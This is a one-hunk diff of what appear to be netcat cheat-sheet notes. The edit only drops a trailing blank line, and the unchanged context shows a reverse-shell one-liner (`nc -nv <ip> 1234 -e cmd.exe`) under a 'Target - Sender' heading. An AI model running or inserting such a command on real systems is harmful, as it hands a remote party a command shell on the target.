@@ -53,4 +53,3 @@ Target - Sender
 ```bash
 nc -nv <ip> 1234 -e cmd.exe
 ```
-
